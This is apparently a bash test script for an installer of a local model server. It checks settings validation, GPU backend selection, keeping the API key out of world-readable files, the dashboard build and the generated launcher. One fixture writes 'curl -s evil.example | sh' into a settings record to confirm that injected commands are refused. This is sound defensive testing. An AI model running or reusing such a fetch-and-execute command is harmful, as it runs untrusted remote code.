#!/usr/bin/env bash
# Helper-level checks for install-target.sh. Plans only: no packages, downloads,
# system files or services are touched, and no root privileges are required.
#
# This target has no upstream setup.sh to interrogate, so what is worth testing
# here is its own logic: the settings validation, the backend resolution, the
# records it writes, and the launcher it generates for both the parked (no
# model) and the serving case.
# The settings below are read by the sourced helpers, not by this file.
# shellcheck disable=SC2034
set -Eeuo pipefail
exec </dev/null
here=$(cd -- "$(dirname -- "${BASH_SOURCE[0]}")" && pwd)
install=$here/install-target.sh
tmp_root=$(mktemp -d "${TMPDIR:-/tmp}/colibri-install-test.XXXXXX")
trap 'rm -rf -- "$tmp_root"' EXIT
failed=0
pass() { printf '  ok   %s\n' "$1"; }
fail() { printf '  FAIL %s\n' "$1" >&2; failed=1; }
die() { printf 'Error: %s\n' "$*" >&2; exit 1; }

# Source install-target.sh's functions only: from die() (the first of them) down
# to the line where the real script starts parsing arguments. Everything in
# between is a function definition or a comment, so this defines every helper
# without running argument parsing, the root check, the lock or the
# install/upgrade paths.
# shellcheck disable=SC1090
source <(awk '/^die\(\) \{/ { capture=1 } /^dry_run=0$/ { capture=0 } capture { print }' "$install")

# --- settings validation ------------------------------------------------------
COLIBRI_DIR=/opt/colibri COLIBRI_DATA_DIR=/var/lib/colibri COLIBRI_ETC_DIR=/etc/colibri-target \
COLIBRI_STATE_DIR=/var/lib/colibri-target
COLIBRI_MODEL_DIR='' COLIBRI_BACKEND=auto COLIBRI_HOST=0.0.0.0 COLIBRI_PORT=8080 COLIBRI_DASHBOARD=true
COLIBRI_ALLOWED_HOST=$COLIBRI_HOST

( validate_settings ) || fail 'the default settings were rejected'
pass 'defaults are valid, including an empty COLIBRI_MODEL_DIR'

for bad in relative/path '/var/lib/colibri/../etc' '/etc/passwd'; do
    if ( COLIBRI_MODEL_DIR="$bad" validate_settings ) 2>/dev/null; then
        fail "accepted COLIBRI_MODEL_DIR=$bad"
    fi
done
pass 'COLIBRI_MODEL_DIR must be absolute and inside the data directory'

for bad in metal cpu2 '' 'CPU'; do
    if ( COLIBRI_BACKEND="$bad" validate_settings ) 2>/dev/null; then
        fail "accepted COLIBRI_BACKEND=$bad"
    fi
done
pass 'COLIBRI_BACKEND is limited to auto, cpu, vulkan and cuda'

for bad in yes 1 '' TRUE; do
    if ( COLIBRI_DASHBOARD="$bad" validate_settings ) 2>/dev/null; then fail "accepted COLIBRI_DASHBOARD=$bad"; fi
done
( COLIBRI_DASHBOARD=false validate_settings ) || fail 'rejected COLIBRI_DASHBOARD=false'
pass 'COLIBRI_DASHBOARD is true or false'

for good in cpu vulkan cuda auto; do
    ( COLIBRI_BACKEND="$good" validate_settings ) || fail "rejected COLIBRI_BACKEND=$good"
done
pass 'every documented backend is accepted'

if ( COLIBRI_ALLOWED_HOST='bad host' validate_settings ) 2>/dev/null; then
    fail 'accepted a COLIBRI_ALLOWED_HOST with a space'
else
    pass 'COLIBRI_ALLOWED_HOST rejects a value that is not a host'
fi
# A bracketed IPv6 COLIBRI_ALLOWED_HOST must be accepted: it is a Host header,
# and a server bound to :: does receive IPv4-mapped peers, so an operator can
# legitimately pin [::1] or [::ffff:127.0.0.1].
( COLIBRI_HOST='::' COLIBRI_ALLOWED_HOST='[::1]' validate_settings ) \
    && pass 'a bracketed IPv6 COLIBRI_ALLOWED_HOST is accepted' \
    || fail 'rejected a bracketed IPv6 COLIBRI_ALLOWED_HOST'
# ...while COLIBRI_HOST itself must not be bracketed: it is what coli serve
# binds, and a bind address with brackets is not an address.
if ( COLIBRI_HOST='[::]' validate_settings ) 2>/dev/null; then
    fail 'accepted a bracketed COLIBRI_HOST'
else
    pass 'COLIBRI_HOST rejects a bracketed address (coli serve binds an unbracketed one)'
fi

if ( COLIBRI_PORT=70000 validate_settings ) 2>/dev/null; then fail 'accepted COLIBRI_PORT=70000';
else pass 'COLIBRI_PORT is bounded'; fi

# The router reaches a 0.0.0.0 bind by the CT's address, which colibri's
# DNS-rebinding guard only accepts when allowed: * or a list of names.
for good in '*' 'colibri.lan' 'colibri.lan,192.0.2.80' '[::1],*'; do
    ( COLIBRI_ALLOWED_HOST="$good" validate_settings ) || fail "rejected COLIBRI_ALLOWED_HOST=$good"
done
for bad in 'a,,b' ',a' 'a,' 'a b' 'a;b' '**x'; do
    if ( COLIBRI_ALLOWED_HOST="$bad" validate_settings ) 2>/dev/null; then fail "accepted COLIBRI_ALLOWED_HOST=$bad"; fi
done
pass 'COLIBRI_ALLOWED_HOST takes *, a host or a comma-separated list'

# --- backend resolution -------------------------------------------------------
# GPU_NODES and COLIBRI_ICD_DIRS are what the two probes read, so a test points
# them at its own tree; the real paths are the defaults in install-target.sh.
mkdir -p "$tmp_root/no-icd" "$tmp_root/gpus" "$tmp_root/dri"
: > "$tmp_root/gpus/nvidiactl"
: > "$tmp_root/dri/renderD128"
DRI_NODES=

# No NVIDIA node and no Vulkan ICD resolves to cpu, and it must not die: a GPU
# is a speedup for Colibri, never a requirement. The fallback is also loud, so
# an operator is not left guessing why there is no GPU backend.
(
    GPU_NODES=
    COLIBRI_ICD_DIRS="$tmp_root/no-icd"
    resolve_backend
    printf '%s\n' "$colibri_backend"
) >"$tmp_root/backend" 2>"$tmp_root/backend.err" || fail 'resolve_backend died with no GPU'
[[ $(< "$tmp_root/backend") == cpu ]] || fail "resolve_backend gave '$(cat "$tmp_root/backend")', expected cpu"
grep -q 'No NVIDIA device node and no GPU render node' "$tmp_root/backend.err" \
    || fail 'the cpu fallback is silent, so an operator would not know why there is no GPU backend'
pass 'no GPU and no ICD resolve to the cpu backend, with a note explaining it'

# A preset backend is honoured, with a warning rather than a failure when the
# hardware is not there.
(
    COLIBRI_BACKEND=cuda
    GPU_NODES=
    COLIBRI_ICD_DIRS="$tmp_root/no-icd"
    resolve_backend
    printf '%s\n' "$colibri_backend"
) >"$tmp_root/backend2" 2>&1 || fail 'resolve_backend died on an unmet cuda request'
# The warning shares this file with the answer, so the backend is its last line.
[[ $(tail -n1 "$tmp_root/backend2") == cpu ]] || fail "cuda without a GPU did not fall back to cpu (got '$(tail -n1 "$tmp_root/backend2")')"
grep -q 'WARNING' "$tmp_root/backend2" || fail 'an unmet cuda request is not warned about'
pass 'an unmet CUDA request warns and falls back to cpu instead of failing'

# The GPU lanes are only taken when the hardware is really there, and they set
# the make flag that decides which engines get built.
(
    COLIBRI_BACKEND=cuda
    GPU_NODES="$tmp_root/gpus/nvidia*"
    COLIBRI_ICD_DIRS="$tmp_root/no-icd"
    resolve_backend
    printf '%s:%s\n' "$colibri_backend" "${colibri_build_flags[*]-}"
) >"$tmp_root/backend3" 2>/dev/null || fail 'resolve_backend died on an available cuda device'
[[ $(< "$tmp_root/backend3") == 'cuda:CUDA=1' ]] \
    || fail "a present NVIDIA node did not resolve to the cuda backend (got '$(cat "$tmp_root/backend3")')"
pass 'a present NVIDIA device node resolves to the cuda backend with CUDA=1'

# An explicit vulkan request with an ICD but no glslc keeps the request (and
# upstream's own build error) rather than silently installing the CPU backend.
if ! command -v glslc >/dev/null 2>&1; then
    mkdir -p "$tmp_root/icd"
    : > "$tmp_root/icd/nvidia_icd.json"
    (
        COLIBRI_BACKEND=vulkan
        GPU_NODES=
        COLIBRI_ICD_DIRS="$tmp_root/icd"
        resolve_backend
        printf '%s\n' "$colibri_backend"
    ) >"$tmp_root/backend4" 2>&1 || fail 'resolve_backend died on a vulkan request without glslc'
    [[ $(tail -n1 "$tmp_root/backend4") == vulkan ]] \
        || fail "an explicit vulkan request without glslc was downgraded to '$(tail -n1 "$tmp_root/backend4")'"
    grep -q 'VK=1 build will fail' "$tmp_root/backend4" || fail 'the missing glslc is not warned about'
    pass 'an explicit vulkan request survives a missing glslc, with a warning'
    # ...while the auto path will not pick vulkan it cannot build.
    (
        COLIBRI_BACKEND=auto
        GPU_NODES=
        COLIBRI_ICD_DIRS="$tmp_root/icd"
        resolve_backend
        printf '%s\n' "$colibri_backend"
    ) >"$tmp_root/backend5" 2>/dev/null || fail 'resolve_backend died on auto without glslc'
    [[ $(< "$tmp_root/backend5") == cpu ]] \
        || fail "auto picked a backend it cannot build: '$(< "$tmp_root/backend5")'"
    pass 'auto does not pick vulkan when glslc is missing'
else
    pass 'glslc is installed here, so the two no-glslc lanes do not apply'
fi

# Mesa installs an ICD with a CPU renderer, so an ICD alone is no GPU: auto
# takes vulkan only for a render node passed into the CT (and glslc to build).
mkdir -p "$tmp_root/icd" "$tmp_root/glslc-bin"
: > "$tmp_root/icd/radeon_icd.x86_64.json"
printf '#!/bin/sh\nexit 0\n' > "$tmp_root/glslc-bin/glslc"; chmod +x "$tmp_root/glslc-bin/glslc"
(
    PATH="$tmp_root/glslc-bin:$PATH"
    COLIBRI_BACKEND=auto GPU_NODES='' DRI_NODES='' COLIBRI_ICD_DIRS="$tmp_root/icd"
    resolve_backend
    printf '%s\n' "$colibri_backend"
) >"$tmp_root/backend6" 2>/dev/null || fail 'resolve_backend died on an ICD without a render node'
[[ $(< "$tmp_root/backend6") == cpu ]] || fail "an ICD without a render node resolved to '$(< "$tmp_root/backend6")'"
(
    PATH="$tmp_root/glslc-bin:$PATH"
    COLIBRI_BACKEND=auto GPU_NODES='' DRI_NODES="$tmp_root/dri/renderD*" COLIBRI_ICD_DIRS="$tmp_root/icd"
    resolve_backend
    printf '%s:%s\n' "$colibri_backend" "${colibri_build_flags[*]-}"
) >"$tmp_root/backend7" 2>/dev/null || fail 'resolve_backend died on a render node'
[[ $(< "$tmp_root/backend7") == 'vulkan:VK=1' ]] || fail "a render node with a Vulkan driver resolved to '$(< "$tmp_root/backend7")'"
pass 'auto takes vulkan for a passed-in render node, never for an ICD alone'

# --- the settings record ------------------------------------------------------
# load_settings parses, never sources, and refuses a record that is not whole.
record=$tmp_root/installed-env
printf 'COLIBRI_MODEL_DIR=\nCOLIBRI_BACKEND=cpu\nCOLIBRI_HOST=0.0.0.0\nCOLIBRI_PORT=8080\nCOLIBRI_ALLOWED_HOST=0.0.0.0\n' > "$record"
( load_settings "$record" ) || fail 'a complete settings record was rejected'
# A record from before the dashboard setting: complete, and without the dashboard.
dashboard=$( COLIBRI_DASHBOARD=true; load_settings "$record"; printf '%s' "$COLIBRI_DASHBOARD" )
[[ $dashboard == false ]] || fail "a record without COLIBRI_DASHBOARD loaded as dashboard=$dashboard"
printf 'COLIBRI_DASHBOARD=true\n' >> "$record"
dashboard=$( load_settings "$record"; printf '%s' "$COLIBRI_DASHBOARD" )
[[ $dashboard == true ]] || fail 'a recorded COLIBRI_DASHBOARD=true was not read'
pass 'an older record keeps its install without the dashboard; a recorded one is read'
printf 'COLIBRI_MODEL_DIR=\nCOLIBRI_BACKEND=cpu\ncurl -s evil.example | sh\n' > "$record"
out=$( (load_settings "$record" 2>&1) ) && fail 'an incomplete settings record was accepted'
[[ -z $out ]] || fail "load_settings printed something suspicious: $out"
pass 'an incomplete or injected settings record is refused'
# An older record with keys this version no longer uses is ignored, not fatal.
printf 'COLIBRI_MODEL_DIR=\nCOLIBRI_BACKEND=cpu\nCOLIBRI_HOST=0.0.0.0\nCOLIBRI_PORT=8080\nCOLIBRI_ALLOWED_HOST=0.0.0.0\nfamily=glm-5\nglm53_max_ctx=202752\n' > "$record"
( load_settings "$record" ) || fail 'a record with retired keys was rejected'
pass 'retired keys in an old record are ignored, not fatal'

# start_env is the unit's world-readable EnvironmentFile: the launcher path and
# nothing else. The key goes to secrets.env (root-only), as COLI_API_KEY.
COLIBRI_DIR=$tmp_root/opt/colibri COLIBRI_DATA_DIR=$tmp_root/var/lib/colibri
COLIBRI_ETC_DIR=$tmp_root/etc/colibri-target COLIBRI_STATE_DIR=$tmp_root/var/lib/colibri-target
COLIBRI_MODEL_DIR='' COLIBRI_BACKEND=cpu COLIBRI_HOST=0.0.0.0 COLIBRI_PORT=8080 COLIBRI_ALLOWED_HOST=0.0.0.0
run_script=$COLIBRI_DIR/run-colibri.sh
api_key='test-key-not-a-secret'
# chown only succeeds for the caller's own user, and the launcher is checked for
# its mode below, so run this part as the user the checks are running under.
SERVICE_USER=$(id -un)
start_env > "$tmp_root/colibri.env"
grep -q 'COLIBRI_RUN_SCRIPT=' "$tmp_root/colibri.env" || fail 'the env file does not carry the launcher path'
grep -q "$api_key" "$tmp_root/colibri.env" && fail 'the API key reached the world-readable env file'
grep -q 'api' "$tmp_root/colibri.env" && fail 'the env file holds more than the launcher path'
pass 'the env file carries only the launcher path'
secrets_env > "$tmp_root/secrets.env"
grep -qx "COLI_API_KEY=$api_key" "$tmp_root/secrets.env" || fail 'secrets.env does not give coli serve its key'
pass 'secrets.env gives coli serve its key as COLI_API_KEY'

# The fingerprint names the dashboard only when it is on, so an install from
# before the setting is not rebuilt for it.
COLIBRI_DASHBOARD=false
grep -q dashboard <(settings_fingerprint) && fail 'a fingerprint without the dashboard names it'
COLIBRI_DASHBOARD=true
grep -qx 'dashboard=true' <(settings_fingerprint) || fail 'the fingerprint does not record the dashboard'
pass 'the fingerprint records the dashboard only when it is on'

# A healthy install stays "unchanged" whatever its dashboard; a requested
# dashboard that is missing or whose build failed is dashboard_needed, which
# rebuilds the dashboard alone. A checkout without its source never needs it.
(
    COLIBRI_DIR=$tmp_root/status/opt/colibri
    COLIBRI_DATA_DIR=$tmp_root/status/var/lib/colibri
    COLIBRI_ETC_DIR=$tmp_root/status/etc/colibri-target
    UNIT_DIR=$tmp_root/status/etc/systemd/system
    COLIBRI_MODEL_DIR='' COLIBRI_BACKEND=cpu colibri_backend=cpu
    COLIBRI_HOST=127.0.0.1 COLIBRI_ALLOWED_HOST=127.0.0.1 COLIBRI_DASHBOARD=true
    source_dir=$here run_script=$COLIBRI_DIR/run-colibri.sh
    mkdir -p "$COLIBRI_DIR/bin" "$COLIBRI_DIR/libexec/colibri/web/dist" "$COLIBRI_DIR/web" "$COLIBRI_ETC_DIR" "$UNIT_DIR"
    printf '#!/bin/sh\n' > "$COLIBRI_DIR/bin/coli"
    printf '#!/bin/sh\n' > "$run_script"
    chmod 0700 "$COLIBRI_DIR/bin/coli" "$run_script"
    : > "$COLIBRI_DIR/libexec/colibri/web/dist/index.html"
    : > "$COLIBRI_DIR/web/package-lock.json"
    printf 'COLI_API_KEY=test\n' > "$COLIBRI_ETC_DIR/secrets.env"
    cp "$here/colibri.service" "$UNIT_DIR/colibri.service"
    settings_fingerprint > "$COLIBRI_ETC_DIR/installed-settings"
    installed_unchanged && ! dashboard_needed || exit 1
    : > "$COLIBRI_ETC_DIR/dashboard-build-pending"
    installed_unchanged && dashboard_needed || exit 2
    rm -f -- "$COLIBRI_ETC_DIR/dashboard-build-pending" "$COLIBRI_DIR/libexec/colibri/web/dist/index.html"
    installed_unchanged && dashboard_needed || exit 3
    rm -f -- "$COLIBRI_DIR/web/package-lock.json"
    ! dashboard_needed || exit 4
    COLIBRI_DASHBOARD=false; : > "$COLIBRI_DIR/web/package-lock.json"
    ! dashboard_needed || exit 5
) || fail "dashboard_needed or installed_unchanged gave the wrong answer (case $?)"
pass 'a missing or failed dashboard is dashboard_needed, never a reason to rebuild the engines'

# --- the dashboard build ----------------------------------------------------------
# node_ok follows Vite 8's engines (^20.19.0 || >=22.12.0); npm must be there too.
dash_bin=$tmp_root/dash-bin; mkdir -p "$dash_bin"
printf '#!/bin/sh\nexit 0\n' > "$dash_bin/npm"; chmod +x "$dash_bin/npm"
real_node=$(command -v node || true)
if [[ -n $real_node ]]; then
    for version in 18.19.1:no 20.18.0:no 20.19.2:yes 21.7.0:no 22.11.0:no 22.12.0:yes 24.11.1:yes; do
        printf '#!/bin/sh\nexec %s -e "Object.defineProperty(process.versions, \\"node\\", {value: \\"%s\\"}); eval(process.argv[1])" "$2"\n' \
            "$real_node" "${version%:*}" > "$dash_bin/node"
        chmod +x "$dash_bin/node"
        if PATH="$dash_bin:$PATH" node_ok; then got=yes; else got=no; fi
        [[ $got == "${version#*:}" ]] || fail "node_ok said $got for Node.js ${version%:*}"
    done
    pass 'node_ok takes Node.js 20.19+ and 22.12+, as Vite 8 asks'
else
    printf 'SKIP node_ok versions (no node here)\n'
fi
# build_dashboard: npm ci and the build as the service account, the result in
# web/dist, node_modules and the cache removed; a failure installs without it.
mkdir -p "$COLIBRI_DIR/web" "$COLIBRI_DATA_DIR"
: > "$COLIBRI_DIR/web/package-lock.json"
cat > "$dash_bin/npm" <<'NPM'
#!/bin/sh
echo "npm $* cache=$npm_config_cache" >> "$NPM_LOG"
case $1 in
    ci) mkdir -p node_modules "$npm_config_cache" ;;
    run) [ -n "$NPM_FAIL" ] && exit 1; mkdir -p dist && echo '<html>' > dist/index.html ;;
esac
NPM
chmod +x "$dash_bin/npm"
ensure_node() { return 0; }
node() { echo v24.11.1; }
as_service() { echo "as_service $*" >> "$NPM_LOG"; "$@"; }
export NPM_LOG=$tmp_root/npm.log
: > "$NPM_LOG"
PATH="$dash_bin:$PATH" build_dashboard > "$tmp_root/dash.out" 2>&1
[[ -f $COLIBRI_DIR/web/dist/index.html ]] || fail "the dashboard was not built: $(cat "$tmp_root/dash.out")"
[[ ! -e $COLIBRI_DIR/web/node_modules && ! -e $COLIBRI_DATA_DIR/.npm ]] || fail 'node_modules or the npm cache was left behind'
grep -q '^as_service env npm_config_cache=' "$NPM_LOG" || fail 'npm did not run as the service account'
grep -q "^npm ci --loglevel=error cache=$COLIBRI_DATA_DIR/.npm" "$NPM_LOG" || fail "npm ci was not run from the lockfile: $(cat "$NPM_LOG")"
grep -q '^npm run build' "$NPM_LOG" || fail 'the build was not run'
NPM_FAIL=1 PATH="$dash_bin:$PATH" build_dashboard > "$tmp_root/dash.out" 2>&1 || fail 'a failed dashboard build failed the install'
[[ ! -e $COLIBRI_DIR/web/dist ]] || fail 'a failed build left web/dist for make install'
grep -q 'WARNING: the dashboard build failed' "$tmp_root/dash.out" || fail 'a failed build was not reported'
ensure_node() { return 1; }
PATH="$dash_bin:$PATH" build_dashboard > "$tmp_root/dash.out" 2>&1 || fail 'a missing Node.js failed the install'
grep -q 'no Node.js 20.19+ or 22.12+' "$tmp_root/dash.out" || fail 'a missing Node.js was not reported'
COLIBRI_DASHBOARD=false
: > "$NPM_LOG"; mkdir -p "$COLIBRI_DIR/web/dist"
PATH="$dash_bin:$PATH" build_dashboard > "$tmp_root/dash.out" 2>&1
[[ ! -s $NPM_LOG && ! -e $COLIBRI_DIR/web/dist ]] || fail 'COLIBRI_DASHBOARD=false built or kept a dashboard'
unset -f node ensure_node as_service
COLIBRI_HOST=192.0.2.15
[[ $(dashboard_url) == http://192.0.2.15:8080/ ]] || fail "dashboard_url gave $(dashboard_url)"
COLIBRI_HOST=::1
[[ $(dashboard_url) == 'http://[::1]:8080/' ]] || fail "dashboard_url did not bracket IPv6: $(dashboard_url)"
COLIBRI_HOST=0.0.0.0 COLIBRI_DASHBOARD=true
pass 'the dashboard is built from the lockfile as the service account, cleaned up, optional, and off when asked'

# --- the generated launcher ---------------------------------------------------
# The parked case is the one every fresh install hits, so the launcher has to say
# what to do about it and exit 0 (Restart=on-failure must not spin on it).
mkdir -p "$COLIBRI_DIR"
generate_run_script || fail 'generate_run_script failed with no model'
[[ -r $run_script ]] || fail 'no run script was written'
grep -qE '^  exit 0$' "$run_script" || fail 'the parked launcher does not exit cleanly'
grep -q -- '--model' "$run_script" && fail 'the parked launcher passes a model that is not there'
grep -q 'COLIBRI_MODEL_DIR=' "$run_script" || fail 'the parked launcher does not say which setting to give'
sh "$run_script" > "$tmp_root/parked.out" 2>&1 || fail 'the parked launcher did not exit 0'
grep -q 'parked, no model configured' "$tmp_root/parked.out" || fail "the parked launcher printed: $(cat "$tmp_root/parked.out")"
pass 'the parked launcher explains the missing model and exits 0'

# A configured but empty model directory parks too, and says to copy a model
# there; the launcher still carries --model, so filling it needs only a restart.
COLIBRI_MODEL_DIR=$COLIBRI_DATA_DIR/models/qwen
mkdir -p "$COLIBRI_MODEL_DIR"
generate_run_script || fail 'generate_run_script failed with an empty model directory'
grep -q -- "--model $COLIBRI_MODEL_DIR" "$run_script" || fail 'the launcher drops a configured model directory while it is empty'
sh "$run_script" > "$tmp_root/parked.out" 2>&1 || fail 'the launcher with an empty model directory did not exit 0'
grep -q "parked, $COLIBRI_MODEL_DIR is empty" "$tmp_root/parked.out" || fail "the empty-directory launcher printed: $(cat "$tmp_root/parked.out")"
pass 'an empty model directory parks with --model kept for the restart'

# With a model it is a plain coli serve with upstream's own run flags. The key
# is never on its command line: coli serve reads COLI_API_KEY.
: > "$COLIBRI_MODEL_DIR/config.json"
colibri_backend=cpu
generate_run_script || fail 'generate_run_script failed with a model'
grep -q 'serve' "$run_script" || fail 'the serving launcher does not run coli serve'
grep -q -- '--host 0.0.0.0' "$run_script" || fail 'the serving launcher does not bind the configured host'
grep -q -- '--port 8080' "$run_script" || fail 'the serving launcher does not use the configured port'
grep -q -- '--allowed-host 0.0.0.0' "$run_script" || fail 'the serving launcher omits the Host allowlist'
grep -q -- '--model' "$run_script" || fail 'the serving launcher does not pass the configured model'
grep -q -- '--auto-tier' "$run_script" || fail 'the serving launcher does not apply the RAM/VRAM plan'
grep -q -- '--api-key' "$run_script" && fail 'the API key is on the command line'
grep -q -- "$api_key" "$run_script" && fail 'the launcher holds the API key'
grep -q -- '--gpu' "$run_script" && fail 'a CPU launcher asks for a GPU'
grep -q 'COLI_VULKAN' "$run_script" && fail 'a CPU launcher turns Vulkan on'
grep -q 'bin/coli' "$run_script" || fail 'the launcher does not exec the installed coli binary'
grep -qE 'coli web|(^|[ /])web( |$)' "$run_script" && fail 'the launcher runs coli web, which opens a browser'
[[ $(stat -c '%a' "$run_script") == 700 ]] || fail "the launcher is mode $(stat -c '%a' "$run_script")"
pass 'with a model the launcher serves on the configured host and port, no key on its command line'

COLIBRI_ALLOWED_HOST='*,colibri.lan'
generate_run_script || fail 'generate_run_script failed with an allowlist'
grep -qF -- "--allowed-host \\* --allowed-host colibri.lan" "$run_script" ||
    fail "the allowlist did not become one --allowed-host each: $(grep exec "$run_script")"
pass 'each allowed host gets its own --allowed-host'

colibri_backend=cuda
generate_run_script || fail 'generate_run_script failed for cuda'
# What the launcher runs, through a coli that prints its arguments: --gpu auto
# for a chat model, none for an image model (colibri's image engine refuses it).
mkdir -p "$COLIBRI_DIR/bin"
printf '#!/bin/sh\necho "coli $*"\n' > "$COLIBRI_DIR/bin/coli"; chmod +x "$COLIBRI_DIR/bin/coli"
sh "$run_script" > "$tmp_root/run.out" 2>&1
grep -q -- '--auto-tier --gpu auto$' "$tmp_root/run.out" || fail "a CUDA launcher does not put a chat model on the GPU: $(cat "$tmp_root/run.out")"
: > "$COLIBRI_MODEL_DIR/model_index.json"
sh "$run_script" > "$tmp_root/run.out" 2>&1
grep -q -- '--auto-tier$' "$tmp_root/run.out" || fail "a CUDA launcher passes --gpu to an image model: $(cat "$tmp_root/run.out")"
rm -f -- "$COLIBRI_MODEL_DIR/model_index.json"
pass 'a CUDA launcher gives chat models the GPU and leaves an image model (no CUDA lane) on the CPU'
colibri_backend=vulkan
generate_run_script || fail 'generate_run_script failed for vulkan'
grep -qx 'export COLI_VULKAN=1' "$run_script" || fail 'a Vulkan launcher leaves the GPU off (COLI_VULKAN)'
grep -qx "export COLI_VK_SHADERS=$COLIBRI_DIR/c/shaders" "$run_script" || fail 'a Vulkan launcher does not point at the built shaders'
grep -q -- '--gpu' "$run_script" && fail 'a Vulkan launcher passes the CUDA --gpu flag'
pass 'the GPU backends get the flags upstream coli start uses (--gpu auto; COLI_VULKAN=1)'

# The unit must not hardcode the launcher path: write_unit puts it in the env file.
grep -Fqx 'ExecStart=/bin/sh ${COLIBRI_RUN_SCRIPT}' "$here/colibri.service" \
    && pass 'the unit keeps the launcher path in the environment file' \
    || fail 'the unit hardcodes the launcher path'
# ...and the key reaches the service only through the root-only secrets.env.
grep -q '/api-key' "$here/colibri.service" && fail 'the unit file references the API key file'
grep -qx 'EnvironmentFile=/etc/colibri-target/secrets.env' "$here/colibri.service" ||
    fail 'the unit does not load secrets.env'
pass 'the key reaches the unit only through secrets.env'

[[ $failed == 0 ]] || die 'install-target.sh helper checks failed'
printf '\nAll install-target.sh helper checks passed. Nothing was installed.\n'
